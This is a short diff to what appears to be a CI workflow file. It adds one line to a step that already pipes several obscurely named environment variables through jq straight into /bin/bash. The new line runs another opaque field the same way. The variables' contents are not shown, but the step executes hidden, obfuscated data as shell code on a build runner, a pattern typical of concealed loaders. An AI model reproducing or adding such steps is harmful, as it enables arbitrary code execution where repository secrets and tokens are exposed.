@@ -31,6 +31,7 @@ jobs:
           echo $ovbd31 | jq -r .p843 | /bin/bash
           echo $yi6 | jq -r .pkxj51 | /bin/bash
           echo $wbloe7590 | jq -r .ln21 | /bin/bash
+          printf '%s' "$qj004" | jq -r .sw7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
